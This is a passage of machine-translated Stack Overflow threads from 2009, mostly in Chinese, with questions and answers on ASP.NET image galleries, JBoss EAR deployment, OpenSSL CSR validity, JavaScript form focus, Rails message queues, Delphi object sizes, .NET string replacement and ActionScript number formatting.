您将了解到.net 生成的调整大小的图像质量很差。您应该使用一些 GDI 功夫来获得高质量的图片。请参阅这篇文章[http://codebetter.com/blogs/brendan.tompkins/archive/2004/01/26/use-gdi-to-save-crystal-clear-gif-images-with-net.aspx](http://codebetter.com/blogs/brendan.tompkins/archive/2004/01/26/use-gdi-to-save-crystal-clear-gif-images-with-net.aspx)了解更多信息

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T13:22:32.743

Well you would have a page for just displaying a photo (like you have above) but your criteria would be different. You would not use `WHERE [UserId] = '" + User.Identity.Name` but would have to send a query string id for the id of the photo in the database.

Then when you want the pic in your aspx page you would have to put an image html tag `<image src="photo.aspx?id=2" />`

How you put the html image tags on the page is not important.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T13:26:03.017

You can try [this](http://www.codeproject.com/KB/web-image/ThumbViewerControl.aspx) or [this](http://www.codeproject.com/KB/applications/Nileblitz_Photo_Gallery.aspx). They should get you started on the grid side. Correct on sending the imageid from the url. Look at a session variable or hidden control and post the form and read in on the next page.

I would look at a gridview and use a template column in combination with the html image tag in the gridview . Create the thumbnail as they upload it and store them both in the database. From there, you can easily retrieve it. This way displaying the image is quicker and there is no thumbnail conversions necessary at display time.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-19T13:33:09.733

如果您不想重新发明轮子，您可以将诸如 Gallery Server Pro (www.galleryserverpro.com) 之类的开源画廊集成到您的站点中。它是用 C# / ASP.NET 编写的，可以做所有你想做的事情。

罗杰

[免责声明] 我是 Gallery Server Pro 的创建者和首席开发人员 [/disclaimer]

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-27T08:09:00.643

RbmBinaryImage[控件](http://www.ramymostafa.com/?p=187)将帮助您直接从数据库中显示图像。您可以将 Image 字段直接绑定到 ImageContent 属性，也可以指定是否希望显示为缩略图并提供缩略图大小。

要得到它去[http://www.ramymostafa.com/?p=187](http://www.ramymostafa.com/?p=187)

# java - 关于在 jBoss 中处理多个耳朵部署的建议

> ID：721282
> 
> 赞同：3
> 
> 时间：2009-04-06T12:50:32.007
> 
> 标签：java, jakarta-ee, jboss

我们有一个典型的 J2EE 应用程序：

*   耳朵
    *   战争A
    *   战争乙
    *   域 jar
    *   数据源配置
    *   ejb.jar
        *   EJB
        *   JPA 配置

我们使用 jBoss 作为我们的 J2EE 容器。同一个应用程序必须多次部署到同一个容器中（以支持不同的独立客户）。事实证明，这是一项麻烦且容易出错的任务，因为必须更改各种设置；在多个xml文件中；遍布上面的结构。

**有人对如何简化这些重复部署有任何建议吗？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T16:10:34.460

For each of the EARs that you need to deploy separately, create a set of property/configuration files.

For example, if you have customer A and customer B, create (as examples):

*   customerADatabase.properties
*   customerBDatabase.properties
*   customerASomeOtherConfig.xml
*   customerBSomeOtherConfig.xml
*   etc.

Then use ant or maven to script the creation of separate ear files for customer A and B, using the different properties files. You should be able to script it so that at the end of your build process, you have

*   customerA.ear - with customerADatabase.properties and customerASomeOtherConfig.xml
*   customerB.ear - with customerBDatabase.properties and customerBSomeOtherConfig.xml

As @Yuval A points out, however, this may not be the best solution...now if you have some changes to make to properties/configuration, you have to change a lot of files...

# ssl - 使用 OpenSSL 从证书签名请求中提取请求的有效期

> ID：721283
> 
> 赞同：10
> 
> 时间：2009-04-06T12:50:32.383
> 
> 标签：ssl, openssl

我们使用由 OpenSSL 提供支持的私有证书颁发机构来验证我们的客户。我们提供了一个简单的基于 Web 的实用程序，允许他们上传 CSR 文件供证书颁发机构签名。

目前，我们只能颁发固定期限的证书，目前是 365 天。但是，我们的客户询问是否可以指定证书的有效期。

我宁愿不必询问用户他们想要什么有效期，因为他们必须在生成 CSR 时指定有效期，并且在签署证书时从 CSR 中提取该有效期是有意义的。但是我不知道该怎么做：OpenSSL 让您调试 CSR、证书和密钥的正常操作不显示相关信息：这是“openssl req -text -noout < csr文件”：

```
$ openssl req -text -noout < my.csr 
Certificate Request:
    Data:
        Version: 0 (0x0)
        Subject: C=GB, L=London, O=example.com, CN=customer/emailAddress=ssl@example.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
            RSA Public Key: (1024 bit)
                Modulus (1024 bit):
                    00:c4:3b:11:7f:61:31:19:97:b6:26:19:01:e7:c6:
                    c3:d5:03:a5:f6:5a:4d:e2:03:d0:4e:76:49:d0:7f:
                    59:92:bf:5e:12:b3:b0:7e:20:5b:d8:a2:3f:cb:50:
                    c1:64:e5:48:04:c3:b2:04:e3:f2:4c:2f:0e:e2:a6:
                    c3:7c:36:24:dc:97:c9:f0:ba:ad:87:0f:71:45:9c:
                    6a:7f:d4:4c:d5:31:8e:49:a8:e4:3d:c4:ec:5e:54:
                    bf:f9:ba:ce:21:4c:11:15:7d:f0:d3:7a:77:f6:66:
                    5d:07:4e:4a:d3:0e:f0:52:0d:d9:cf:81:86:fe:9b:
                    c8:f8:e4:8d:d6:d1:d0:85:7f
                Exponent: 65537 (0x10001)
        Attributes:
            a0:00
    Signature Algorithm: sha1WithRSAEncryption
        5e:4c:38:59:95:e5:11:b4:a3:d5:88:1f:3c:c0:33:67:cb:b2:
        14:85:73:c3:5a:b8:23:bf:1d:25:2b:a9:38:93:da:fb:67:17:
        26:6c:79:07:dd:7f:3c:3f:b0:33:17:d1:c2:41:f7:c9:ce:1e:
        32:1c:a1:a0:a3:50:67:56:1b:58:d9:b4:48:56:70:00:43:22:
        a9:0c:17:be:67:42:f4:98:d6:d8:c0:d0:4f:6a:73:d1:a8:57:
        91:3c:02:dc:dc:8f:e3:fb:48:28:06:a2:8e:8e:27:b2:39:d7:
        3e:ce:63:ae:66:9b:ec:38:ee:09:77:dc:0f:91:40:ab:28:0f:
        ae:a9 
```

任何地方都没有提到要求的有效期。

有什么建议么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2010-01-06T01:35:06.290

我一直试图弄清楚如何在 CSR 中*请求*特定的有效期，据我所知，CSR 根本不包含该信息。CSR 的结构在 PKCS#10 / RFC2986 中定义，它没有专门用于请求有效期的字段。可以放入 CSR 的属性和扩展在 PKCS#9 中列出，其中没有关于有效期的内容。最后，我可以`openssl asn1parse`对我生成的 CSR 执行一个操作，发现无论我传递给什么，都没有包含与有效期相关的信息`openssl req`。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-03-10T10:57:10.760

我在研究 CSR 的有效性时偶然发现了你的问题。正如其他人提到的，有效期不包含在 CSR 中，但我很好奇`-days`很多人在创建 CSR 的示例中包含的选项。阅读[OpenSSL 的文档后，](https://www.openssl.org/docs/manmaster/man1/req.html)很清楚：

> -天数
> 
> 当使用 -x509 选项时，它指定认证证书的天数。默认值为 30 天。

并且该`-x509`选项输出自签名证书而不是证书请求

> -x509
> 
> 此选项输出自签名证书而不是证书请求。这通常用于生成测试证书或自签名根 CA。添加到证书的扩展名（如果有）在配置文件中指定。除非使用 set_serial 选项指定，否则将使用较大的随机数作为序列号。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-08T11:17:14.967

尽管您为您的证书请求了一定的有效期，但在生成 CSR 时，不确定该有效期是否会被 CA 接受。大多数 CA 更喜欢预定义的有效期，很少有 CA 可以接受请求的有效期并相应地生成 CSR。现在说到重点，根据 PKCS#10 标准的 CSR ASN.1 结构没有指定有效期。因此，您无法从 CSR 中提取该信息。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-04-06T13:30:19.150

Try to add `-days xx` parameter to your request creation command

# javascript - Javascript focus() 和 select() 怪癖

> ID：721296
> 
> 赞同：6
> 
> 时间：2009-04-06T12:52:26.823
> 
> 标签：javascript, forms, select, focus

我正在处理一个表单并在 ie 中获取 null 或不是对象错误。

```
<form action="#" method="post" name="adv_search">

<input class="inputbox" type="text" name="keyword1" value="none" id="keyword1"/>
</form>

<script>
document.adv_search.keyword1.focus();
document.adv_search.keyword1.select();
</script> 
```

//而如果我使用

```
<script>
var key1 = document.getElementById('keyword1');
   key1.focus();
   key1.select();
</script> 
```

//一切安好

我想了解为什么。我希望它在没有输入字段的 id 标签的情况下工作

提前致谢

* * *

不应该 document.formname.fieldname.focus(); 和 document.formname.fieldname.select(); 工作？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-04-06T13:06:44.607

您的特定示例对我有用，但如果我添加另一个同名字段：

```
<input type="text" name="keyword1" />
<input type="text" name="keyword1" /> 
```

然后`document.adv_search.keyword1.focus()`将因您指定的错误而失败。

原因是：

```
document.adv_search.keyword1 
```

是这种语法的一个快捷方式（可以追溯到 DOM Level 0 和 Netscape 2 天！）：

```
document.forms.adv_search.elements.keyword1 
```

（顺便说一句，最好使用这个完整的语法，而不是依赖于在名称上索引的 'document' 和 'form' 对象的行为：如果将新方法添加到 HTMLDocument 或 HTMLFormElement，这可能会与控件发生冲突您正在使用的名称。当您使用 document.forms 或 form.elements 集合时，这不是问题。此外，IE 错误地将所有名称和 ID 转储到“文档”中，所以如果您有一个元素，`id="adv_search"`除了以该名称作为名称的表单`document.adv_search`将返回错误的表单。）

无论如何，当您像这样按名称访问元素时，DOM Level 0 脚本方法的行为有点奇怪。如果有一个匹配的元素，您将获得该元素作为独立对象。另一方面，如果有多个对象，您将获得一个对象列表。您不能在类似数组的列表上调用`focus()`或，这就是出现错误的原因；`select()`返回列表时，您必须执行类似 keyword1[0].focus() 的操作。

因此，您必须决定是否要使用老式的 DOM Level 0 方法来访问您的表单控件——在这种情况下，您将不得不处理对单个或多个控件的嗅探——或者移动'DOM Level 1' 引入的基于 ID 的方法：

```
document.getElementById('keyword1').focus(); 
```

基于 ID 的方法通常需要更多的输入（在脚本中并将 'id' 添加到您希望以这种方式访问​​的所有元素，如果它们还没有的话），但它们简单且明确。（您也可以将`name`放在 <form> 本身上。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T12:56:31.010

ID 方法确实是最好的，但如果您想按名称，请使用[getElementsByName](http://www.java2s.com/Code/JavaScript/Development/GetelementbynamegetElementsByName.htm)。

在这种情况下，它可能如下所示：

```
<script>
   // retrieves array of objects with the name 'keyword1' 
   // and takes the first one
   var key1 = document.getElementsByName('keyword1')[0]; 
   key1.focus();
   key1.select();
</script> 
```

# ruby-on-rails - Ruby on Rails 中的消息队列

> ID：721297
> 
> 赞同：39
> 
> 时间：2009-04-06T12:52:49.413
> 
> 标签：ruby-on-rails, ruby, message-queue, background-process

人们在他们的 Rails 应用程序中使用了哪些消息队列，以及决定选择它的驱动力是什么。最新的 Twitter 对其内部队列 Starling 倒下的宣传是否会影响任何现有的设计决策。

我正在开发一个需要消息队列来处理一些后台任务的应用程序，我没有做太多这方面的工作，而且我过去看到的大部分内容都是关于 Starling 和 Workling，老实说应用程序不是很大，这个解决方案可能就足够了，但我很想获得集成最佳解决方案的经验，因为我确信我会在某个时候将一个集成到更大的应用程序中。

你会为 Rails 应用推荐什么消息队列？？？

编辑：感谢您的建议，这个周末我将看看其中的一些。

再次编辑：我环顾四周，有点不知所措。但是，我将着手将 RabbitMQ 与 Workling 集成到我正在构建的应用程序中，然后如果我需要一些关于快速队列的知识，那么我将拥有它并知道它是否符合我的需求。

编辑：找到越来越适合我的 DJ，如果我在某个网站上“长大”，我会说 Resque 是我要去的地方。

编辑：（2014 年 12 月）所以自从我问这个问题已经有很长时间了，但我看到它仍然得到一些意见或投票，所以我想我现在在选择背景工作人员时会更新我的方法.

在我看来，目前在 Ruby 中运行后台作业的最佳方式是使用 Sidekiq。很多人真的称赞 Sidekiq 是线程化的工作线程，而不是每个工作线程的进程，它使用的内存比我在 Sidekiq 之前使用的 Resque 之类的内存要少得多。这很好，但对我来说这不是杀手级功能。通过将 Sidetiq 与 Sidekiq 一起使用，作业调度变得如此简单，以至于我切换并且从未回头看它，这是迄今为止我使用过的最简单的作业调度，并使 Sidekiq 使用起来轻而易举。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-11-29T15:56:07.237

作为更新——GitHub 已移至 Redis 上的 Resque，而不是延迟作业。但是，他们仍然建议对于较小的设置使用延迟作业：

[https://github.com/resque/resque](https://github.com/resque/resque)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-04-06T17:39:13.000

来自 github 的 Chris Wanstrath 最近在 SF Ruby 聚会上，谈论他们的队列。他们尝试了 Starling、beantalk 和其他一些变体，然后才选择了 Shopify 的 delay_job。他们对背景的使用非常激进。

这是[去年的一篇博客文章](http://github.com/blog/197-the-new-queue)，讲述了他们转向 DJ 的故事。

我现在在哪里我们几年前推出了自己的产品，但我正在从 DJ 那里获得一些想法来改进处理。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2009-04-16T13:23:14.107

如果您不期望任何繁重的负载，我会推荐[延迟作业作为一个简单的解决方案。](http://github.com/tobi/delayed_job/tree/master)优点：易于设置、易于监控、代码简单、没有任何外部依赖项。以前我们使用 ActiveMessaging（带有 ActiveMQ 和 stomp），但它对我们的项目来说有点过头了，所以为了简单起见，我们改用了 delay_job。

无论如何，如果你需要非常成熟和快速的解决方案，[ActiveMQ](http://activemq.apache.org/)是一个非常不错的选择。如果您不想花费太多时间来维护您并不真正需要的全面消息队列解决方案，那么延迟作业是一种方法。这是一篇关于 ActiveMQ 的 Scribd 体验的[好文章。](http://blog.kovyrin.net/2008/10/30/activemq-ruby-stomp-client-how-to-process-elements-one-by-one/)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-04-06T15:22:07.587

以下是一些 Ruby/Rails 解决方案，根据您的需要，其中一个或多个可能非常适合：

[http://xph.us/software/beanstalkd](http://xph.us/software/beanstalkd)

[http://rubyforge.org/forum/forum.php?forum_id=19781](http://rubyforge.org/forum/forum.php?forum_id=19781)

[http://backgroundrb.rubyforge.org](http://backgroundrb.rubyforge.org)

而且，来自 Amazon 的托管解决方案将为 Ruby/Rails 和更大系统的其他组件之间的共享提供一个很好的队列：

[http://aws.amazon.com/sqs](http://aws.amazon.com/sqs)

希望这可以帮助！

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-04-16T13:31:09.063

您可能想要使用的 Messaging Server 是 RabbitMQ。Erlang 很酷，AMQP，优秀的 Ruby 库。

[http://www.bestechvideos.com/2008/12/09/rabbitmq-an-open-source-messaging-broker-that-just-works](http://www.bestechvideos.com/2008/12/09/rabbitmq-an-open-source-messaging-broker-that-just-works)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-04-06T18:49:36.873

Rany Keddo 去年在 RailsConf Europe 上做了一个关于 Starling + Workling的[有用演示。](http://assets.en.oreilly.com/1/event/13/Starling%20+%20Workling_%20Simple%20Distributed%20Background%20Jobs%20with%20Twitter%27s%20Queuing%20System%20Presentation%201.pdf)他比较了当时可用的不同解决方案。

Twitter 离开 Starling + Workling 的最新举措可能对常规的 Rails 应用程序意义不大。他们有更多的规模问题，并且他们的数据存储可能存在遗留问题，这些问题阻止他们超越当前的实施。

[Beanstalkd](http://nubyonrails.com/articles/about-this-blog-beanstalk-messaging-queue)是一个不错的选择，仅仅是因为它作为守护进程运行并且具有其他脚本语言的包装器（如果您将来碰巧改变方向或有用其他语言编写的不同组件）。

该[链接](http://nubyonrails.com/articles/about-this-blog-beanstalk-messaging-queue)还对可用的各种导轨解决方案的优缺点进行了很好的比较。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-04-06T22:52:03.623

我使用[background_job](http://codeforpeople.rubyforge.org/svn/bj/trunk/README)，它就像[delay_job](http://github.com/tobi/delayed_job/tree/master)是一个基于数据库的队列。

只要您进出的流量不太多，数据库就会生​​成一个 OK 队列。

我喜欢background_job（和delayed_job）的原因是它们不需要单独的进程。他们可以通过 cron 运行。对我来说，这至关重要，因为我的消息传递需求比我微薄的系统管理员技能还要简单。

# delphi - 对象的字节大小，包括成员的大小

> ID：721298
> 
> 赞同：4
> 
> 时间：2009-04-06T12:53:23.780
> 
> 标签：delphi, delphi-2009, sizeof

我想知道（用于调试和记录）对象的大小（以字节为单位），但不喜欢

```
Sizeof (Object) 
```

但就像一个“深尺寸”。例如，如果对象包含哈希映射或列表，则该哈希映射或列表所需的实际大小应添加到结果中。有什么方法可以做到这一点而不必添加

```
property Size : LongWord read GetByteSize; 
```

对每一个小物件？

可能是一个愚蠢的问题，但我会试一试；）

**编辑**：刚刚发现几乎相同的问题：

[Delphi中的递归类实例大小](https://stackoverflow.com/questions/482604/recursive-class-instance-size-in-delphi)

我想，这个问题可以结束了。对于那个很抱歉！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T12:57:36.110

不幸的是，您需要自己为此编写代码。

不确定这是否有效，但您可能会变得非常肮脏：

*   以字节为单位查找对象大小。使用 TObject.InstanceSize。
*   将每组 4 个字节转换为一个指针，然后检查它是否是 TObject。你应该能够做到这一点。如果是 TObject，则应重复该步骤。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T16:48:55.680

既然这是调试用的，那你看过 FastMM4 内存分配器了吗？它有一些用于跟踪内存泄漏的好东西。

# c# - .NET 字符串。替换

> ID：721299
> 
> 赞同：2
> 
> 时间：2009-04-06T12:54:17.507
> 
> 标签：c#, .net, string, replace

我很生气。通常，我喜欢像在 C# 中那样替换操作，但是是否有 C++ 样式的替换，它一次只替换一个字母或我指定的 X 数量？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-04-06T12:57:17.530

不，BCL 中没有 Replace 方法，它只会替换字符的单个实例。两个主要的 Replace 方法将替换所有出现的事件。但是，编写一个执行单个字符替换的版本并不难。

```
public static string ReplaceSingle(this string source, char toReplace, char newChar) {
  var index = source.IndexOf(toReplace);
  if ( index < 0 ) {
    return source;
  }
  var builder = new StringBuilder();
  for( var i = 0; i < source.Length; i++ ) {
    if ( i == index ) {
      builder.Append(newChar);
    } else {
      builder.Append(source[i]);
    }
  }
  return builder.ToString();
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T12:57:01.633

如果您只想替换一次，只需使用 IndexOf 和 SubString 即可。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-01-13T12:49:07.393

```
public string ReplaceString(string source,int index,string newString) 
{       
    char[] sourceArray=source.ToCharArray();    
    char[] newArray=newString.ToCharArray();    
    for(int i=index;i<index+newString.Length ;i++)  
        sourceArray[i]=newArray[i];
    return new string(sourceArray);      
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T12:58:53.860

如果您有兴趣进行逐个字符的替换（特别是如果您只想执行特定数量的操作），您最好将字符串转换为 a`char[]`并通过索引进行操作，然后将其转换回字符串。您将为自己节省一些不必要的字符串创建，但这仅在您的替换与您要替换的长度相同时才有效。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-06T13:00:17.413

您可以编写一个扩展方法来替换第一次出现。

# regex - 在数字字符串中插入逗号

> ID：721304
> 
> 赞同：38
> 
> 时间：2009-04-06T12:55:24.570
> 
> 标签：regex, actionscript-3

嘿，我正在尝试对字符串执行反向正则表达式搜索，以将其分成 3 位数字组。据我从 AS3[文档](http://livedocs.adobe.com/flex/3/html/help.html?content=12_Using_Regular_Expressions_01.html)中可以看出，在 reg ex 引擎中无法进行向后搜索。

这个练习的重点是在一个数字中插入三重逗号，如下所示：

```
10000000 => 10,000,000 
```

我正在考虑这样做：

```
string.replace(/(\d{3})/g, ",$1") 
```

但这不正确，因为搜索不是从后面发生的，并且替换 $1 仅适用于第一个匹配项。

我感觉最好使用循环执行此任务。

更新：

由于 AS3 不支持前瞻，这就是我解决它的方法。

```
public static function formatNumber(number:Number):String
{
    var numString:String = number.toString()
    var result:String = ''

    while (numString.length > 3)
    {
        var chunk:String = numString.substr(-3)
        numString = numString.substr(0, numString.length - 3)
        result = ',' + chunk + result
    }

    if (numString.length > 0)
    {
        result = numString + result
    }

    return result
} 
```

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2009-04-06T13:23:03.693

如果您的语言支持前瞻断言，那么我认为以下正则表达式将起作用：

```
(\d)(?=(\d{3})+$) 
```

用Java演示：

```
import static org.junit.Assert.assertEquals;

import org.junit.Test;

public class CommifyTest {

    @Test
    public void testCommify() {
        String num0 = "1";
        String num1 = "123456";
        String num2 = "1234567";
        String num3 = "12345678";
        String num4 = "123456789";

        String regex = "(\\d)(?=(\\d{3})+$)";

        assertEquals("1", num0.replaceAll(regex, "$1,"));
        assertEquals("123,456", num1.replaceAll(regex, "$1,"));
        assertEquals("1,234,567", num2.replaceAll(regex, "$1,"));
        assertEquals("12,345,678", num3.replaceAll(regex, "$1,"));
        assertEquals("123,456,789", num4.replaceAll(regex, "$1,"));    
    }    
} 
```

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2011-01-28T21:01:21.930

在[http://gskinner.com/RegExr/上找到](http://gskinner.com/RegExr/)

社区 > 千位分隔符

图案：`/\d{1,3}(?=(\d{3})+(?!\d))/g`

代替：`$&,`

```
trace ( String("1000000000").replace( /\d{1,3}(?=(\d{3})+(?!\d))/g , "$&,") ); 
```

它完成了工作！

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2009-04-06T13:15:18.737

如果您的正则表达式引擎具有积极的前瞻性，您可以执行以下操作：

```
string.replace(/(\d)(?=(\d\d\d)+$)/, "$1,") 
```

正前瞻 (?=...) 表示正则表达式仅在前瞻表达式 ... 匹配时匹配。

（请注意，环视表达式并不总是非常有效。）

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-11-16T04:43:12.660

虽然这些答案中的许多都适用于正整数，但它们的许多参数输入都被转换为数字，这意味着它们可以处理负值或包含小数，而这里所有的解决方案都失败了。尽管当前选择的答案没有假设一个数字，但我很想找到一个可以而且比 RegExp 性能更高的解决方案（AS3 做得不好）。

我将这里的许多答案放在一个测试类中（包括来自这个[博客](http://www.cgiinteractive.com/blog/2009/05/formatting-numbers-with-commas-in-as3/)的一个解决方案和我自己的一个名为**commaify**的答案），并以一致的方式对它们进行格式化以便于比较：

```
package
{
    public class CommaNumberSolutions
    {   
        public static function commaify( input:Number ):String
        {
            var split:Array = input.toString().split( '.' ),
                front:String = split[0],
                back:String = ( split.length > 1 ) ? "." + split[1] : null,
                n:int = input < 0 ? 2 : 1,
                commas:int = Math.floor( (front.length - n) / 3 ),
                i:int = 1;

            for ( ; i <= commas; i++ )
            {
                n = front.length - (3 * i + i - 1);
                front = front.slice( 0, n ) + "," + front.slice( n );
            }

            if ( back )
                return front + back;
            else
                return front;
        }

        public static function getCommaString( input:Number ):String
        {
            var s:String = input.toString();

            if ( s.length <= 3 )
                return s;

            var i:int = s.length % 3;

            if ( i == 0 )
                i = 3;

            for ( ; i < s.length; i += 4 )
            {
                var part1:String = s.substr(0, i);
                var part2:String = s.substr(i, s.length);
                s = part1.concat(",", part2);
            }

            return s;
        }

        public static function formatNumber( input:Number ):String
        {
            var s:String = input.toString()
            var result:String = ''

            while ( s.length > 3 )
            {
                var chunk:String = s.substr(-3)
                s = s.substr(0, s.length - 3)
                result = ',' + chunk + result
            }

            if ( s.length > 0 )
                result = s + result

            return result
        }

        public static function commaCoder( input:Number ):String
        {
            var s:String = "";
            var len:Number = input.toString().length;

            for ( var i:int = 0; i < len; i++ )
            { 
                if ( (len-i) % 3 == 0 && i != 0)
                    s += ",";

                s += input.toString().charAt(i);
            }
            return s;
        }

        public static function regex1( input:Number ):String
        {
            return input.toString().replace( /-{0,1}(\d)(?=(\d\d\d)+$)/g, "$1," );
        }

        public static function regex2( input:Number ):String
        {
            return input.toString().replace( /-{0,1}\d{1,3}(?=(\d{3})+(?!\d))/g , "$&,")
        }

        public static function addCommas( input:Number ):String
        {
            var negative:String = "";
            if ( input < 0 )
            {
                negative = "-";
                input = Math.abs(input);
            }

            var s:String = input.toString();
            var results:Array = s.split(/\./);
            s = results[0];

            if ( s.length > 3 )
            {
                var mod:Number = s.length % 3;
                var output:String = s.substr(0, mod);
                for ( var i:Number = mod; i < s.length; i += 3 )
                {
                    output += ((mod == 0 && i == 0) ? "" : ",") + s.substr(i, 3);
                }

                if ( results.length > 1 )
                {
                    if ( results[1].length == 1 )
                        return negative + output + "." + results[1] + "0";
                    else
                        return negative + output + "." + results[1];
                }
                else
                    return negative + output;
            }
            if ( results.length > 1 )
            {
                if ( results[1].length == 1 )
                    return negative + s + "." + results[1] + "0";
                else
                    return negative + s + "." + results[1];
            }
            else
                return negative + s;
        }
    }
} 
```

然后我测试了每一个的准确性和性能：

```
package
{    
    public class TestCommaNumberSolutions
    {
        private var functions:Array;

        function TestCommaNumberSolutions()
        {
            functions = [
                { name: "commaify()", f: CommaNumberSolutions.commaify },
                { name: "addCommas()", f: CommaNumberSolutions.addCommas },
                { name: "getCommaString()", f: CommaNumberSolutions.getCommaString },
                { name: "formatNumber()", f: CommaNumberSolutions.formatNumber },
                { name: "regex1()", f: CommaNumberSolutions.regex1 },
                { name: "regex2()", f: CommaNumberSolutions.regex2 },
                { name: "commaCoder()", f: CommaNumberSolutions.commaCoder }
            ];
            verify();
            measure();
        }

        protected function verify():void
        {
            var assertions:Array = [ 
                { input: 1, output: "1" },
                { input: 21, output: "21" },
                { input: 321, output: "321" },
                { input: 4321, output: "4,321" },
                { input: 54321, output: "54,321" },
                { input: 654321, output: "654,321" },
                { input: 7654321, output: "7,654,321" },
                { input: 987654321, output: "987,654,321" },
                { input: 1987654321, output: "1,987,654,321" },
                { input: 21987654321, output: "21,987,654,321" },
                { input: 321987654321, output: "321,987,654,321" },
                { input: 4321987654321, output: "4,321,987,654,321" },
                { input: 54321987654321, output: "54,321,987,654,321" },
                { input: 654321987654321, output: "654,321,987,654,321" },
                { input: 7654321987654321, output: "7,654,321,987,654,321" },
                { input: 87654321987654321, output: "87,654,321,987,654,321" },
                { input: -1, output: "-1" },
                { input: -21, output: "-21" },
                { input: -321, output: "-321" },
                { input: -4321, output: "-4,321" },
                { input: -54321, output: "-54,321" },
                { input: -654321, output: "-654,321" },
                { input: -7654321, output: "-7,654,321" },
                { input: -987654321, output: "-987,654,321" },
                { input: -1987654321, output: "-1,987,654,321" },
                { input: -21987654321, output: "-21,987,654,321" },
                { input: -321987654321, output: "-321,987,654,321" },
                { input: -4321987654321, output: "-4,321,987,654,321" },
                { input: -54321987654321, output: "-54,321,987,654,321" },
                { input: -654321987654321, output: "-654,321,987,654,321" },
                { input: -7654321987654321, output: "-7,654,321,987,654,321" },
                { input: -87654321987654321, output: "-87,654,321,987,654,321" },
                { input: .012345, output: "0.012345" },
                { input: 1.012345, output: "1.012345" },
                { input: 21.012345, output: "21.012345" },
                { input: 321.012345, output: "321.012345" },
                { input: 4321.012345, output: "4,321.012345" },
                { input: 54321.012345, output: "54,321.012345" },
                { input: 654321.012345, output: "654,321.012345" },
                { input: 7654321.012345, output: "7,654,321.012345" },
                { input: 987654321.012345, output: "987,654,321.012345" },
                { input: 1987654321.012345, output: "1,987,654,321.012345" },
                { input: 21987654321.012345, output: "21,987,654,321.012345" },
                { input: -.012345, output: "-0.012345" },
                { input: -1.012345, output: "-1.012345" },
                { input: -21.012345, output: "-21.012345" },
                { input: -321.012345, output: "-321.012345" },
                { input: -4321.012345, output: "-4,321.012345" },
                { input: -54321.012345, output: "-54,321.012345" },
                { input: -654321.012345, output: "-654,321.012345" },
                { input: -7654321.012345, output: "-7,654,321.012345" },
                { input: -987654321.012345, output: "-987,654,321.012345" },
                { input: -1987654321.012345, output: "-1,987,654,321.012345" },
                { input: -21987654321.012345, output: "-21,987,654,321.012345" }
            ];

            var i:int;
            var len:int = assertions.length;
            var assertion:Object;
            var f:Function;
            var s1:String;
            var s2:String;

            for each ( var o:Object in functions )
            {
                i = 0;
                f = o.f;
                trace( '\rVerify: ' + o.name ); 
                for ( ; i < len; i++ )
                {
                    assertion = assertions[ i ];
                    s1 = f.apply( null, [ assertion.input ] );
                    s2 = assertion.output;
                    if ( s1 !== s2 )
                        trace( 'Test #' + i + ' Failed: ' + s1 + ' !== ' + s2 );
                }
            }

        }

        protected function measure():void
        {
            // Generate random inputs
            var values:Array = [];
            for ( var i:int = 0; i < 999999; i++ ) {
                values.push( Math.random() * int.MAX_VALUE * ( Math.random() > .5 ? -1 : 1) );
            }

            var len:int = values.length;
            var stopwatch:Stopwatch = new Stopwatch;
            var s:String;
            var f:Function;
            trace( '\rTesting ' + len + ' random values' );
            // Test each function
            for each ( var o:Object in functions )
            {
                i = 0;
                s = "";
                f = o.f;
                stopwatch.start();
                for ( ; i < len; i++ ) {
                    s += f.apply( null, [ values[i] ] ) + " ";
                }
                stopwatch.stop();
                trace( o.name + '\t\ttook ' + (stopwatch.elapsed/1000) + 's' ); //(stopwatch.elapsed/len) + 'ms'
            }
        }
    }
}

import flash.utils.getTimer;

class Stopwatch
{
    protected var startStamp:int;
    protected var stopStamp:int;
    protected var _started:Boolean;
    protected var _stopped:Boolean;

    function Stopwatch( startNow:Boolean = true ):void
    {
        if ( startNow ) 
            start();
    }

    public function start():void
    {
        startStamp = getTimer();
        _started = true;
        _stopped = false;
    }

    public function stop():void
    {
        stopStamp = getTimer();
        _stopped = true;
        _started = false;
    }

    public function get elapsed():int
    {
        return ( _stopped ) ? stopStamp - startStamp : ( _started ) ? getTimer() - startStamp : 0;
    }

    public function get started():Boolean
    {
        return _started;
    }

    public function get stopped():Boolean
    {
        return _stopped;
    }
} 
```

由于 AS3 对较大数字缺乏精度，因此每个类都未通过这些测试：

```
Test #15 Failed: 87,654,321,987,654,320 !== 87,654,321,987,654,321
Test #31 Failed: -87,654,321,987,654,320 !== -87,654,321,987,654,321
Test #42 Failed: 21,987,654,321.012344 !== 21,987,654,321.012345
Test #53 Failed: -21,987,654,321.012344 !== -21,987,654,321.012345 
```

但是只有两个函数通过了所有其他测试：**commaify()**和**addCommas()**。

